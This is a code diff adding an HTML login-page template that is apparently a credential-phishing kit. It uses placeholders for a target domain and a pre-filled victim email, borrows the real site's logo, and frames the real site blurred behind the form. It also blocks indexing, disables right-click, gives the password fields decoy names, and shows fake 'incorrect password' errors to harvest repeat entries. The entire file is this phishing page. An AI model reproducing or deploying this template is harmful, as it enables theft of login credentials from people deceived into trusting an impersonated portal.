@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>{{ins}} Login Portal</title>
+  <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+  height: 100%;
+  font-family: 'Poppins', sans-serif;
+  background: transparent;
+  overflow: hidden;
+    }
+
+    iframe.background-frame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      border: none;
+      filter: blur(6px) brightness(0.7);
+    }
+
+    .login-container {
+      position: relative;
+      max-width: 400px;
+      margin: 10vh auto;
+      background: #ffffffee;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .login-header {
+      margin-bottom: 30px;
+    }
+
+    .login-header img {
+      width: 60px;
+      height: 60px;
+      object-fit: contain;
+      margin-bottom: 10px;
+    }
+
+    .login-header h1 {
+      font-size: 22px;
+      color: #333;
+    }
+
+    .input-field {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      transition: border 0.3s;
+    }
+
+    .input-field input:focus {
+      border-color: #4a90e2;
+      outline: none;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #4a90e2;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .login-btn:hover {
+      background-color: #357ABD;
+    }
+
+    .error-message {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #e74c3c;
+      display: none;
+    }
+
+    .privacy-note {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body oncontextmenu="return false;">
+  <iframe src="https://www.{{ins}}" class="background-frame"></iframe>
+
+  <div class="login-container">
+    <div class="login-header">
+      <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Logo">
+      <h1 id="banNer" style="text-transform: capitalize;"></h1>
+    </div>
+    <form action="first" method="POST">
+      <div class="input-field">
+        <input type="email" id="ai" name="horse" value="{{eman}}" required placeholder="Email address">
+      </div>
+      <div class="input-field">
+        <input type="password" id="pr" name="pig" required placeholder="Password">
+      </div>
+      <button type="submit" id="submit-btn" class="login-btn">Log In</button>
+
+      <div class="error-message" id="mgss">Incorrect password..! Please try again.</div>
+      <div class="error-message" id="error">Account not found. Please check your email.</div>
+    </form>
+
+    <div class="privacy-note">
+      © {{ins}} Portal | Privacy Policy
+    </div>
+  </div>
+
+</body>
+
+</html>
